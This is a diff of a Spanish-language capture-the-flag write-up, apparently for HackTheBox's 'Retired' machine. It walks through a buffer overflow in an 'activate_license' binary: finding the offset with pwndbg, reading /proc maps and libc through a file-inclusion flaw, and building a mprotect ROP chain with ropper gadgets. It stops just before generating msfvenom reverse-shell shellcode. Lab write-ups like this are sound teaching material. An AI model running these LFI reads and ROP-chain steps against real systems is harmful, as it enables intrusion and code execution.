-[+] activated license: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaa0  
-
+[+] reading 528 bytes
+[+] activated license: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
 Thread 2.1 "activate_licens" received signal SIGSEGV, Segmentation fault.
 </span><span class="az">0x00005555555555c0 </span><span class="p">in </span><span class="am">activate_license</span><span class="p"> (</span><span class="az">sockfd</span><span class="p">=4) at </span><span class="ve">activate_license.c</span><span class="p">:64
 64	activate_license.c: No existe el fichero o el directorio.
-</span><span class="ro">pwndbg></span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Aqui podemos buscar mediante el patron la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> necesarios de basura antes de llegar a sobreescribir la direccion de <code class="language-plaintext highlighter-rouge">retorno</code>, estos son <code class="language-plaintext highlighter-rouge">520</code> en este caso</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">x/gx $rsp
-</span><span class="az">0x7fffffffe4e8</span><span class="p">:	0x6361616161616170
-</span><span class="ro">pwndbg> </span><span class="p">cyclic -l 0x6361616161616170
-</span><span class="sa">Finding cyclic pattern of 8 bytes: b'paaaaaac' (hex: 0x7061616161616163)  
-</span><span class="ve">Found at offset 520
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rbp
+$1 = 0x4242424242424242
+</span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
+</span><span class="az">0x7fffffffe298</span><span class="p">:	0x4343434343434343
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
@@ -531,84 +361,83 @@ Thread 2.1 "activate_licens" received signal SIGSEGV, Segmentation fault.
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Logramos tomar el control de la siguiente dirección a ejecutar sin embargo tenemos varias limitaciones, la mas importante es que no tenemos conexion directa con el programa por lo que no podriamos enviar una cadena <code class="language-plaintext highlighter-rouge">rop</code> para hacer un leak de <code class="language-plaintext highlighter-rouge">libc</code> y volver a <code class="language-plaintext highlighter-rouge">main</code> como en la máquina <a href="/hackthebox/safe#bof-puts">safe</a>, y si la tuvieramos tampoco seria posible ya que tenemos el <code class="language-plaintext highlighter-rouge">PIE</code> que cambia la dirección base en cada ejecución</p>
+
 </section>
 
 <section class="post" id="bof-mprotect">
 <br><h3 class="post-title">Buffer Overflow - mprotect</h3><br>
 
-<p class="plain-text">La tecnica que utilzaremos será usar <code class="language-plaintext highlighter-rouge">mprotect</code> para modificar los permisos de la <code class="language-plaintext highlighter-rouge">pila</code> y hacerla <code class="language-plaintext highlighter-rouge">ejecutable</code>, para despues poder ejecutar ahi nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, en el <a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">manual</a> de mprotect podemos ver que esta función recibe 3 <code class="language-plaintext highlighter-rouge">argumentos</code></p>
+<p class="plain-text">Aunque no tenemos un leak de <code class="language-plaintext highlighter-rouge">libc</code> tampoco lo necesitamos ya que el exploit se ejecutá en un hilo por lo que las direcciones base no cambian y al tener un <code class="language-plaintext highlighter-rouge">LFI</code> podemos leer el archivo <code class="language-plaintext highlighter-rouge">maps</code> del pid del proceso que contiene las direcciones base tando del binario como de las librerias y segmentos como lo es el stack</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://10.10.11.154/?page=/proc/400/maps"</span><span class="p">
+55d3cd575000-55d3cd576000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
+55d3cd576000-55d3cd577000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
+55d3cd577000-55d3cd578000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
+55d3cd578000-55d3cd579000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
+55d3cd579000-55d3cd57a000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
+55d3ce68f000-55d3ce6b0000 rw-p 00000000 00:00 0                          [heap]
+7f670e11a000-7f670e11c000 rw-p 00000000 00:00 0 
+7f670e11c000-7f670e11d000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7f670e11d000-7f670e11f000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7f670e11f000-7f670e120000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7f670e120000-7f670e121000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7f670e121000-7f670e122000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7f670e122000-7f670e129000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7f670e129000-7f670e139000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7f670e139000-7f670e13e000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7f670e13e000-7f670e13f000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7f670e13f000-7f670e140000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7f670e140000-7f670e144000 rw-p 00000000 00:00 0 
+7f670e144000-7f670e153000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7f670e153000-7f670e1ed000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7f670e1ed000-7f670e286000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7f670e286000-7f670e287000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7f670e287000-7f670e288000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7f670e288000-7f670e2ad000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f670e2ad000-7f670e3f8000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f670e3f8000-7f670e442000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f670e442000-7f670e443000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f670e443000-7f670e446000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f670e446000-7f670e449000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f670e449000-7f670e44d000 rw-p 00000000 00:00 0 
+7f670e44d000-7f670e45d000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
+7f670e45d000-7f670e555000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
+7f670e555000-7f670e589000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
+7f670e589000-7f670e58d000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
+7f670e58d000-7f670e590000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
+7f670e590000-7f670e592000 rw-p 00000000 00:00 0 
+7f670e597000-7f670e598000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f670e598000-7f670e5b8000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f670e5b8000-7f670e5c0000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f670e5c1000-7f670e5c2000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f670e5c2000-7f670e5c3000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f670e5c3000-7f670e5c4000 rw-p 00000000 00:00 0 
+7ffe3ea7d000-7ffe3ea9e000 rw-p 00000000 00:00 0                          [stack]
+7ffe3eb6f000-7ffe3eb73000 r--p 00000000 00:00 0                          [vvar]
+7ffe3eb73000-7ffe3eb75000 r-xp 00000000 00:00 0                          [vdso]</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La tecnica que utilzaremos será usar <code class="language-plaintext highlighter-rouge">mprotect</code> para modificar los permisos de la <code class="language-plaintext highlighter-rouge">pila</code> y hacerla <code class="language-plaintext highlighter-rouge">ejecutable</code>, para despues poder ejecutar ahi nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, en el <a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">manual</a> de mprotect podemos ver que esta función recibe 3 <code class="language-plaintext highlighter-rouge">argumentos</code>, el primer argumento es la dirección a la que queremos cambiarle los privilegios, esta será el stack, la segunda el tamaño del stack y la ultima el permiso donde <code class="language-plaintext highlighter-rouge">7</code> es igual a <code class="language-plaintext highlighter-rouge">rwx</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="no">int </span><span class="na">mprotect</span><span class="p">(</span><span class="no">void </span><span class="o">*</span><span class="am">addr</span><span class="p">, </span><span class="na">size_t </span><span class="am">len</span><span class="p">, </span><span class="no">int </span><span class="am">prot</span><span class="p">);  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El primer argumento será la <code class="language-plaintext highlighter-rouge">direccion</code> donde queremos modificar los permisos que en este caso sera donde inicia el <code class="language-plaintext highlighter-rouge">stack</code>, el segundo sera la <code class="language-plaintext highlighter-rouge">longitud</code> que sera el tamaño del stack o pila y el ultimo son los <code class="language-plaintext highlighter-rouge">permisos</code> que sera <code class="language-plaintext highlighter-rouge">7</code> equivalente a <code class="language-plaintext highlighter-rouge">rwx</code></p>
-<a href="/hackthebox/retired/4.png" target="_blank"><div><p><img src="/hackthebox/retired/4.png"></p></div></a>
-
-<p class="plain-text">Tenemos el argumento 3, para obtener los primeros 2 podemos ver las <code class="language-plaintext highlighter-rouge">direcciones</code> de la ejecución en el pid <code class="language-plaintext highlighter-rouge">400</code> viendo el archivo <code class="language-plaintext highlighter-rouge">maps</code> que se muestran casi al final</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://retired.htb/?page=/proc/400/maps"</span><span class="p">
-564086262000-564086263000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
-564086263000-564086264000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
-564086264000-564086265000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
-564086265000-564086266000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
-564086266000-564086267000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
-564086334000-564086355000 rw-p 00000000 00:00 0                          [heap]
-7f82a80e1000-7f82a80e3000 rw-p 00000000 00:00 0 
-7f82a80e3000-7f82a80e4000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
-7f82a80e4000-7f82a80e6000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
-7f82a80e6000-7f82a80e7000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
-7f82a80e7000-7f82a80e8000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
-7f82a80e8000-7f82a80e9000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
-7f82a80e9000-7f82a80f0000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
-7f82a80f0000-7f82a8100000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
-7f82a8100000-7f82a8105000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
-7f82a8105000-7f82a8106000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
-7f82a8106000-7f82a8107000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
-7f82a8107000-7f82a810b000 rw-p 00000000 00:00 0 
-7f82a810b000-7f82a811a000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
-7f82a811a000-7f82a81b4000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
-7f82a81b4000-7f82a824d000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
-7f82a824d000-7f82a824e000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
-7f82a824e000-7f82a824f000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
-7f82a824f000-7f82a8274000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
-7f82a8274000-7f82a83bf000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
-7f82a83bf000-7f82a8409000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
-7f82a8409000-7f82a840a000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
-7f82a840a000-7f82a840d000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
-7f82a840d000-7f82a8410000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
-7f82a8410000-7f82a8414000 rw-p 00000000 00:00 0 
-7f82a8414000-7f82a8424000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
-7f82a8424000-7f82a851c000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
-7f82a851c000-7f82a8550000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
-7f82a8550000-7f82a8554000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
-7f82a8554000-7f82a8557000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
-7f82a8557000-7f82a8559000 rw-p 00000000 00:00 0 
-7f82a855e000-7f82a855f000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
-7f82a855f000-7f82a857f000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
-7f82a857f000-7f82a8587000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
-7f82a8588000-7f82a8589000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
-7f82a8589000-7f82a858a000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
-7f82a858a000-7f82a858b000 rw-p 00000000 00:00 0 
-7ffd16c4c000-7ffd16c6d000 rw-p 00000000 00:00 0                          [stack]
-7ffd16d8e000-7ffd16d92000 r--p 00000000 00:00 0                          [vvar]
-7ffd16d92000-7ffd16d94000 r-xp 00000000 00:00 0                          [vdso]</span>
-</code></pre></div></div><br>
-
 <p class="plain-text">En el archivo <code class="language-plaintext highlighter-rouge">maps</code> podemos ver las <code class="language-plaintext highlighter-rouge">direcciones</code> desde donde inicia hasta donde termina el <code class="language-plaintext highlighter-rouge">stack</code>, con ello obtenemos el primer argumento, para el segundo que es el <code class="language-plaintext highlighter-rouge">tamaño</code> podemos calculardo restandole la direccion de inicio a la de final</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">stack_start </span><span class="o">= </span><span class="mi">0x7ffd16c4c000
-</span><span class="p">stack_end </span><span class="o">= </span><span class="mi">0x7ffd16c6d000
+<code><span class="p">stack_start </span><span class="o">= </span><span class="mi">0x7ffe3ea7d000
+</span><span class="p">stack_end </span><span class="o">= </span><span class="mi">0x7ffe3ea9e000
 </span><span class="p">stack_size</span><span class="o"> = </span><span class="p">stack_end </span><span class="o">- </span><span class="p">stack_start</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Además en el archivo <code class="language-plaintext highlighter-rouge">maps</code> podemos tomar la dirección donde inicia <code class="language-plaintext highlighter-rouge">libc</code> en el proceso para tomarlo como <code class="language-plaintext highlighter-rouge">libc_base</code> para algunas operaciones mas adelante</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">libc_base</span><span class="o"> = </span><span class="mi">0x7f82a824f000</span>
+<code><span class="p">libc_base</span><span class="o"> = </span><span class="mi">0x7f670e288000</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para poder obtener algunas funciones descargaremos el archivo <code class="language-plaintext highlighter-rouge">libc</code> de la máquina</p>
+<p class="plain-text">Para poder obtener los ofssets descargaremos el archivo <code class="language-plaintext highlighter-rouge">libc</code> de la máquina</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://retired.htb/?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so"</span><span class="p"> -o libc-2.31.so  </span>
+<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://10.10.11.154/?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so"</span><span class="p"> -o libc-2.31.so  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Con <code class="language-plaintext highlighter-rouge">readelf</code> podemos obtener un <code class="language-plaintext highlighter-rouge">offset</code> de la función <code class="language-plaintext highlighter-rouge">mprotect</code> que al sumarlo con la dirección de <code class="language-plaintext highlighter-rouge">libc_base</code> nos daria como resultado la <code class="language-plaintext highlighter-rouge">dirección</code> de la función</p>
@@ -617,54 +446,36 @@ junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A
   1225: 00000000000f8c20    33 FUNC    WEAK   DEFAULT   14 </span><span class="ro">mprotect@@</span><span class="p">GLIBC_2.2.5  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Agregaremos al script de python el <code class="language-plaintext highlighter-rouge">offset</code> de la función mprotect como un entero</p>
+<p class="plain-text">Tenemos los 3 argumentos para <code class="language-plaintext highlighter-rouge">mprotect</code> pero para que la función los tome es necesario tener el control de los registros <code class="language-plaintext highlighter-rouge">rdi</code>, <code class="language-plaintext highlighter-rouge">rsi</code> y <code class="language-plaintext highlighter-rouge">rdx</code> para poder enviarlos ahi y llamarla, para ello con <code class="language-plaintext highlighter-rouge">ropper</code> buscaremos <code class="language-plaintext highlighter-rouge">gadgets</code> que hagan un pop a ellos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">offset_mprotect </span><span class="o">= </span><span class="mi">0xf8c20</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Tenemos los 3 argumentos para <code class="language-plaintext highlighter-rouge">mprotect</code> pero para que la función los tome es necesario tener el control de los registros <code class="language-plaintext highlighter-rouge">RDI</code>, <code class="language-plaintext highlighter-rouge">RSI</code> y <code class="language-plaintext highlighter-rouge">RDX</code> para poder enviarlos ahi y llamarla, para ello con <code class="language-plaintext highlighter-rouge">ropper</code> buscaremos <code class="language-plaintext highlighter-rouge">gadgets</code> que hagan un pop a ellos</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --search </span><span class="am">"pop rdi; ret;"</span><span class="p">  
+<code><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --console
 </span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
 </span><span class="ve">[LOAD] </span><span class="p">loading... 100%
 </span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
-</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rdi; ret;
+</span><span class="ro">(libc-2.31.so/ELF/x86_64)> </span><span class="p">search pop rdi; ret;  
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rdi; ret;
 
-</span><span class="ve">[INFO] </span><span class="p">File: libc-2.31.so
-</span><span class="ro">0x0000000000026796</span><span class="p">: </span><span class="am">pop </span><span class="p">rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span><span class="p"> 
+</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
+</span><span class="ro">0x0000000000026796</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;
 
-</span><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --search </span><span class="am">"pop rsi; ret;"</span><span class="p">  
-</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
-</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
-</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
-</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rsi; ret;
+</span><span class="ro">(libc-2.31.so/ELF/x86_64)></span><span class="p"> search pop rsi; ret;  
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rsi; ret;
 
-</span><span class="ve">[INFO] </span><span class="p">File: libc-2.31.so
-</span><span class="ro">0x000000000002890f</span><span class="p">: </span><span class="am">pop </span><span class="p">rsi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span><span class="p"> 
+</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
+</span><span class="ro">0x000000000002890f</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rsi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
 
-</span><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --search </span><span class="am">"pop rdx; ret;"</span><span class="p">  
-</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
-</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
-</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
-</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rdx; ret;
+</span><span class="ro">(libc-2.31.so/ELF/x86_64)> </span><span class="p">search pop rdx; ret;  
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rdx; ret;
 
-</span><span class="ve">[INFO] </span><span class="p">File: libc-2.31.so
-</span><span class="ro">0x00000000000cb1cd</span><span class="p">: </span><span class="am">pop </span><span class="p">rdx</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span><span class="p"></span>
+</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
+</span><span class="ro">0x00000000000cb1cd</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rdx</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
+
+</span><span class="ro">(libc-2.31.so/ELF/x86_64)></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Agregaremos estos 3 <code class="language-plaintext highlighter-rouge">offsets</code> de gadgets para tener el control de los registros</p>
+<p class="plain-text">La idea ahora seria despues de llamar a <code class="language-plaintext highlighter-rouge">mprotect</code> hacer un salto al registro <code class="language-plaintext highlighter-rouge">rsp</code> que es la pila y ahora que ésta es ejecutable ejecutar ahi nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, aunque no encontramos un <code class="language-plaintext highlighter-rouge">jmp rsp</code> si encontramos instrucciones equivalentes como <code class="language-plaintext highlighter-rouge">call esp</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">offset_pop_rdi </span><span class="o">= </span><span class="mi">0x26796
-</span><span class="p">offset_pop_rsi </span><span class="o">= </span><span class="mi">0x2890f</span><span class="p">
-</span><span class="p">offset_pop_rdx </span><span class="o">= </span><span class="mi">0xcb1cd</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">La idea ahora seria despues de llamar a <code class="language-plaintext highlighter-rouge">mprotect</code> hacer un salto al registro <code class="language-plaintext highlighter-rouge">RSP</code> que es la pila y ahora que esta es ejecutable ejecutar ahi nuestro <code class="language-plaintext highlighter-rouge">shellcode</code></p>
-<a href="/hackthebox/retired/5.png" target="_blank"><div><p><img src="/hackthebox/retired/5.png"></p></div></a>
-
-<p class="plain-text">Usando ropper sobre <code class="language-plaintext highlighter-rouge">libc</code> encontramos varios gadgets que nos serviran para ejecutar lo que esta en el registro <code class="language-plaintext highlighter-rouge">RSP</code>, podemos usar cualquiera de ellos</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --jmp rsp  
+<code><span class="ro">(libc-2.31.so/ELF/x86_64)> </span><span class="p">jmp rsp   
 
 JMP Instructions
 ================
@@ -692,24 +503,12 @@ JMP Instructions
 </span><span class="ro">0x0000000000137d99</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
 </span><span class="ro">0x000000000016e7b7</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
 </span><span class="p">
-22 gadgets found</span>
+22 gadgets found
+</span><span class="ro">
+(libc-2.31.so/ELF/x86_64)></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">También definimos este <code class="language-plaintext highlighter-rouge">offset</code> en el script de python junto con los demas</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">offset_call_rsp </span><span class="o">= </span><span class="mi">0x27a5e</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Ahora a cada uno de los <code class="language-plaintext highlighter-rouge">offsets</code> les sumaremos la dirección de <code class="language-plaintext highlighter-rouge">libc_base</code> para asi obtener las <code class="language-plaintext highlighter-rouge">direcciones</code> finales de cada uno, ademas usamos <code class="language-plaintext highlighter-rouge">p64</code> para el formato</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mprotect </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_mprotect)
-pop_rdi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rdi)
-pop_rsi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rsi)
-pop_rdx </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rdx)
-call_rsp </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_call_rsp)</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Ya en el <code class="language-plaintext highlighter-rouge">RSP</code> podemos ejecutar nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, en este caso generamos uno con <code class="language-plaintext highlighter-rouge">msfvenom</code> que nos envie una <code class="language-plaintext highlighter-rouge">reverse shell</code>, esto indicando el formato <code class="language-plaintext highlighter-rouge">python</code></p>
+<p class="plain-text">Ya en el <code class="language-plaintext highlighter-rouge">rsp</code> podemos ejecutar nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, en este caso generamos uno con <code class="language-plaintext highlighter-rouge">msfvenom</code> que nos envie una <code class="language-plaintext highlighter-rouge">reverse shell</code>, esto indicando el formato <code class="language-plaintext highlighter-rouge">python</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
